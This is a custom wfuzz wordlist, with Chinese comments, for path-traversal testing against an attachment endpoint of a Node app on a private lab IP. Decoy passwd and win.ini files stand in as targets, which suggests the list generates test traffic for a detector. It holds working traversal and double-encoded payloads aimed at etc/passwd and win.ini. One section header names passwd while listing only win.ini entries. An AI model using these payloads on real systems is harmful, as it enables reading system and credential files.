# 針對 backend/routes/events.js 的 attachment sink 客製 wordlist
# ATTACH_DIR = backend/data/attachments,decoy 在 backend/etc/passwd、backend/windows/win.ini(2 層深度)
# 用法: wfuzz -c -z file,lfi_sink_traversal_wordlist.txt -u 'http://192.168.194.86:8080/api/events/1/attachment?file=FUZZ'
#
# 預期分三種真實回應(不是假的,都是這個 Node sink 實際會發生的行為):
#   200 - 深度剛好對到 decoy,真的讀到檔案
#   404 - 深度不對 / wrapper 語法 Node 不認得 / 檔案不存在
#   500 - payload 含 null byte,fs.readFile 對嵌入 NUL 直接同步丟 ERR_INVALID_ARG_VALUE

# ── 深度 2,應該 200(打中 backend/etc/passwd) ──

..\..\windows\win.ini
../../windows\win.ini
..\..\/windows/win.ini

# ── 錯誤深度,應該 404(真實 pentest 猜深度失敗的樣子) ──

%2e%2e%5c%2e%2e%5cwindows%5cwin.ini

# ── 雙重編碼(對應 spec has_double_encoding),Express 只解一層,
#    剩下的 %2f 會變成檔名字面字元,預期一律 404,但這是正確且有意義的 miss ──
..%252f..%252fetc%252fpasswd
..%252F..%252Fetc%252Fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%25322f..%25322fetc%25322fpasswd
